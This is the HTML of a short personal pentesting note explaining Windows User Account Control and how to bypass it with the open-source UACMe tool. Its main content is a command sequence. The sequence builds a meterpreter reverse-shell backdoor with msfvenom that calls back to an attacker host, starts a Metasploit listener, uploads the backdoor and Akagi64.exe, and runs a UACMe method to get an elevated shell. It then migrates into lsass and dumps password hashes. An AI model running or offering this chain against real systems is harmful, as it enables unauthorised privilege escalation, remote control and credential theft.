<!DOCTYPE html>
<html lang="en-US">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>PrivEsc - Bypassing UAC with UACMe | ðŸ•µ 1dnu11</title>
<meta name="title" content="PrivEsc - Bypassing UAC with UACMe" />
<meta name="description" content="UAC (User Account Control) UAC is a security feature introduced in Windows Vista. It is used to prevent changes to the operating system without the proper adminitrative approval. A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, where a privileged user will just be prompted with a consent prompt.
It&rsquo;s possible to bypass UAC in order to execute malicious executables with elevated privileges." />
<meta name="keywords" content="," />


<meta property="og:title" content="PrivEsc - Bypassing UAC with UACMe" />
<meta property="og:description" content="UAC (User Account Control) UAC is a security feature introduced in Windows Vista. It is used to prevent changes to the operating system without the proper adminitrative approval. A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, where a privileged user will just be prompted with a consent prompt.
It&rsquo;s possible to bypass UAC in order to execute malicious executables with elevated privileges." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/zet/bypassing-uac-with-uacme/" /><meta property="og:image" content="http://localhost:1313/images/share.png" /><meta property="article:section" content="zet" />
<meta property="article:published_time" content="2024-03-22T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-03-22T00:00:00+00:00" /><meta property="og:site_name" content="1dnu11" />



<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/images/share.png" /><meta name="twitter:title" content="PrivEsc - Bypassing UAC with UACMe"/>
<meta name="twitter:description" content="UAC (User Account Control) UAC is a security feature introduced in Windows Vista. It is used to prevent changes to the operating system without the proper adminitrative approval. A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, where a privileged user will just be prompted with a consent prompt.
It&rsquo;s possible to bypass UAC in order to execute malicious executables with elevated privileges."/>



<meta itemprop="name" content="PrivEsc - Bypassing UAC with UACMe">
<meta itemprop="description" content="UAC (User Account Control) UAC is a security feature introduced in Windows Vista. It is used to prevent changes to the operating system without the proper adminitrative approval. A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, where a privileged user will just be prompted with a consent prompt.
It&rsquo;s possible to bypass UAC in order to execute malicious executables with elevated privileges."><meta itemprop="datePublished" content="2024-03-22T00:00:00+00:00" />
<meta itemprop="dateModified" content="2024-03-22T00:00:00+00:00" />
<meta itemprop="wordCount" content="281"><meta itemprop="image" content="http://localhost:1313/images/share.png" />
<meta itemprop="keywords" content="," />
<meta name="referrer" content="no-referrer-when-downgrade" />

  <style>
  body {
    font-family: Verdana, sans-serif;
    margin: auto;
    padding: 20px;
    max-width: 720px;
    text-align: left;
    background-color: #181A1B;
    word-wrap: break-word;
    overflow-wrap: break-word;
    line-height: 1.5;
    color: #D3CFC9;
  }

  h1,
  h2,
  h3,
  h4,
  h5,
  h6,
  strong,
  b {
    color: #D3CFC9;
  }

  a {
    color: #8EC07C;
     
  }

  .title {
    text-decoration: none;
    border: 0;
  }

  .title span {
    font-weight: 400;
  }

  nav a {
    margin-right: 10px;
  }

  textarea {
    width: 100%;
    font-size: 16px;
  }

  input {
    font-size: 16px;
  }

  content {
    line-height: 1.6;
  }

  table {
    width: 100%;
  }

  img {
    max-width: 100%;
  }

  code {
    padding: 2px 5px;
    background-color: #3C3836;
  }

  pre code {
    color: #D79921;
    display: block;
    padding: 20px;
    white-space: pre-wrap;
    font-size: 14px;
    overflow-x: auto;
  }

  div.highlight pre {
    background-color: initial;
    color: initial;
  }

  div.highlight code {
    background-color: unset;
    color: unset;
  }

  blockquote {
    border-left: 1px solid #D79921;
    color: #8EC07C;
    padding-left: 20px;
    font-style: italic;
  }

  footer {
    padding: 25px;
    text-align: center;
  }

  .helptext {
    color: #777;
    font-size: small;
  }

  .errorlist {
    color: #EBA613;
    font-size: small;
  }

   
  ul.blog-posts {
    list-style-type: none;
    padding: unset;
  }

  ul.blog-posts li {
    display: flex;
  }

  ul.blog-posts li span {
    flex: 0 0 130px;
  }

  ul.blog-posts li a:visited {
    color: #D79921;
  }

  @media (prefers-color-scheme: dark) {
    body {
      background-color: #181A1B;
      color: #D3CFC9;
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    strong,
    b {
      color: #D3CFC9;
    }

    a {
      color: #8EC07C;
    }

    code {
      background-color: #3C3836;
    }

    pre code {
      color: #D79921;
    }

    blockquote {
      color: #8;
    }

    textarea,
    input {
      background-color: #181A1B;
      color: #D3CFC9;
    }

    .helptext {
      color: #777;
    }
  }

</style>

</head>

<body>
  <header><a href="/" class="title">
  <h2>ðŸ•µ 1dnu11</h2>
</a>
<nav><a href="/">Home</a>

<a href="/about/">Start Here</a>

<a href="/zet">Zet</a>


<a href="/blog">Blog</a>

</nav>
</header>
  <main>

<content>
  <h1 id="uac-user-account-control">UAC (User Account Control)</h1>
<p>UAC is a security feature introduced in Windows Vista. It is used to prevent changes to the operating system without the proper adminitrative approval. A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, where a privileged user will just be prompted with a consent prompt.</p>
<p>It&rsquo;s possible to bypass UAC in order to execute malicious executables with elevated privileges.</p>
<h1 id="bypassing-uac">Bypassing UAC</h1>
<p>To bypass UAC, we need to have access to a user account that is part of the local adminitrators group.</p>
<p>There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique will differ depending on the version of Windows running on the target system.</p>
<h2 id="uacme">UACMe</h2>
<p>With more than 60 exploits, <a href="https://github.com/hfiref0x/UACME">UACMe</a> is an open source privesc tool developed by <em>@hfire0x</em>. It allows attackers to execute malicious payloads on a Windows target win adminitrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.</p>
<h2 id="bypassing-uac-with-uacme">Bypassing UAC with UACMe</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>&lt;myip&gt; LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1444</span> -f exe &gt; backdoor.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Session 1</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; pgrep explorer
</span></span><span style="display:flex;"><span>meterpreter &gt; migrate &lt;id&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Session 2</span>
</span></span><span style="display:flex;"><span>msf5 &gt; use multi/handler
</span></span><span style="display:flex;"><span>msf5 &gt; set payload windows/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>msf5 &gt; set LHOST myip
</span></span><span style="display:flex;"><span>msf5 &gt; set LPORT <span style="color:#ae81ff">1444</span>
</span></span><span style="display:flex;"><span>msf5 &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Session 1</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; cd C:<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; mkdir Temp
</span></span><span style="display:flex;"><span>meterpreter &gt; cd Temp
</span></span><span style="display:flex;"><span>meterpreter &gt; upload backdoor.exe
</span></span><span style="display:flex;"><span>meterpreter &gt; upload /opt/UACME/Akagi64.exe
</span></span><span style="display:flex;"><span>meterpreter &gt; shell
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\T</span>emp&gt;.<span style="color:#ae81ff">\A</span>kagi64.exe <span style="color:#ae81ff">23</span> C:<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\b</span>ackdoor.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># We should receive a reverse shell on our listener on shell 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dump them hashes!</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; ps -S lsass.exe
</span></span><span style="display:flex;"><span>meterpreter &gt; migrate &lt;PID&gt;
</span></span><span style="display:flex;"><span>meterpreter &gt; hashdump
</span></span></code></pre></div><h2 id="links">Links:</h2>
<ul>
<li><a href="https://github.com/hfiref0x/UACME">UACMe</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works">Microsoft Learn - How User Account Control works</a></li>
</ul>
<p>202403221603</p>

</content>
<p>
  
</p>

  </main>
  <footer>
</footer>

    
</body>

</html>
